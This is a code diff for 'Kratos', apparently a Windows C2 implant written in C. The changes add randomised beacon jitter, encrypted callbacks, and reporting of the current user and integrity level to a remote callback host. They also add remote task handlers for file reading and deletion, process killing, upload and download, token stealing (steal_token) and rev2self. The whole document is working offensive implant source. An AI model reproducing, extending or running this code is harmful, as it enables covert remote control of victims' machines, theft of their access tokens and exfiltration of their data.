@@ -6,6 +6,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <time.h>
 #include <windows.h>
 #include <winhttp.h>
 
@@ -15,9 +16,15 @@
 #define SLEEP_TIME 5
 #endif
 
+#ifndef CALLBACK_JITTER
+#define CALLBACK_JITTER 0
+#endif
+
 // Globals
 char current_uuid[128];
+char last_sent_user[512] = {0}; // Track reported identity to trigger updates
 int current_sleep_time = SLEEP_TIME * 1000; // Convert seconds to milliseconds
+int current_jitter = CALLBACK_JITTER;
 
 #ifndef UUID
 // #define AGENT_UUID "..."
@@ -39,21 +46,26 @@ int current_sleep_time = SLEEP_TIME * 1000; // Convert seconds to milliseconds
 #endif
 
 int main() {
+
+  srand((unsigned int)time(NULL));
   strncpy(current_uuid, AGENT_UUID, sizeof(current_uuid) - 1);
   current_uuid[sizeof(current_uuid) - 1] = '\0';
 
   DEBUG_PRINT("Kratos agent started.");
   DEBUG_PRINT("UUID: %s", current_uuid);
-  // CALLBACK_HOST/PORT are macros, available here if config.h is included
-  // But they are used inside send_c2_message mainly.
-  // DEBUG_PRINT("Target: %s:%d%s", CALLBACK_HOST, CALLBACK_PORT, POST_URI);
-  // We can include defaults here too if we want to print target info.
-  // For brevity let's trust utils handles connection.
+  DEBUG_PRINT("Target: %s:%d/%s", CALLBACK_HOST, CALLBACK_PORT, POST_URI);
+#if defined(KRATOS_AESPSK) && defined(USE_TINY_AES)
+  DEBUG_PRINT("Crypto: AES-256-CBC / tiny-AES backend (no bcrypt.dll)");
+#elif defined(KRATOS_AESPSK) && defined(USE_BCRYPT)
+  DEBUG_PRINT("Crypto: AES-256-CBC / BCrypt backend");
+#else
+  DEBUG_PRINT("Crypto: plaintext");
+#endif
 
   while (1) {
     // Checkin Logic
     if (strncmp(current_uuid, AGENT_UUID, 36) == 0) {
-      if (CheckinSend()) {
+      if (CheckinSend(NULL)) {
         DEBUG_PRINT("Checkin successful. UUID updated to: %s", current_uuid);
       } else {
         DEBUG_PRINT("Checkin failed/retrying...");
@@ -61,10 +73,24 @@ int main() {
     } else {
       // Get Tasking
       char json_msg[4096];
+      char display_user[512] = {0};
+      get_current_display_user(display_user, sizeof(display_user));
+      int integrity = get_integrity_level();
+
+      // Force update if user changed
+      if (strcmp(display_user, last_sent_user) != 0) {
+        DEBUG_PRINT("Identity change detected (%s). Triggering update...",
+                    display_user);
+        CheckinSend(display_user);
+        strncpy(last_sent_user, display_user, sizeof(last_sent_user) - 1);
+      }
+
+      char *escaped_user = json_escape(display_user);
       snprintf(json_msg, sizeof(json_msg),
                "{\"action\": \"get_tasking\", \"tasking_size\": -1, \"uuid\": "
-               "\"%s\"}",
-               current_uuid);
+               "\"%s\", \"user\": \"%s\", \"integrity_level\": %d}",
+               current_uuid, escaped_user, integrity);
+      free(escaped_user);
 
       char *b64_resp = send_c2_message(json_msg);
 
@@ -126,6 +152,58 @@ int main() {
                 else if (strcmp(cmd_name, "exit") == 0)
                   command_exit(task_id, params);
 #endif
+#ifdef INCLUDE_CMD_CAT
+                else if (strcmp(cmd_name, "cat") == 0)
+                  command_cat(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_CP
+                else if (strcmp(cmd_name, "cp") == 0)
+                  command_cp(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_MV
+                else if (strcmp(cmd_name, "mv") == 0)
+                  command_mv(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_RM
+                else if (strcmp(cmd_name, "rm") == 0)
+                  command_rm(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_MKDIR
+                else if (strcmp(cmd_name, "mkdir") == 0)
+                  command_mkdir(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_PS
+                else if (strcmp(cmd_name, "ps") == 0)
+                  command_ps(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_KILL
+                else if (strcmp(cmd_name, "kill") == 0)
+                  command_kill(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_WHOAMI
+                else if (strcmp(cmd_name, "whoami") == 0)
+                  command_whoami(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_IFCONFIG
+                else if (strcmp(cmd_name, "ifconfig") == 0)
+                  command_ifconfig(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_DOWNLOAD
+                else if (strcmp(cmd_name, "download") == 0)
+                  command_download(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_UPLOAD
+                else if (strcmp(cmd_name, "upload") == 0)
+                  command_upload(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_STEAL_TOKEN
+                else if (strcmp(cmd_name, "steal_token") == 0)
+                  command_steal_token(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_REV2SELF
+                else if (strcmp(cmd_name, "rev2self") == 0)
+                  command_rev2self(task_id, params);
+#endif
               }
               cmd_local_ptr += 1;
             }
@@ -135,7 +213,19 @@ int main() {
         free(b64_resp);
       }
     }
-    Sleep(current_sleep_time);
+    // Caluler le délai avec jitter
+    int final_sleep = current_sleep_time;
+    if (current_jitter > 0) {
+      int jitter_range = (current_sleep_time * current_jitter) / 100;
+      if (jitter_range > 0) {
+        int offset = (rand() % (jitter_range * 2 + 1)) - jitter_range;
+        final_sleep += offset;
+      }
+    }
+    if (final_sleep < 0)
+      final_sleep = 0;
+
+    Sleep(final_sleep);
   }
   return 0;
 }
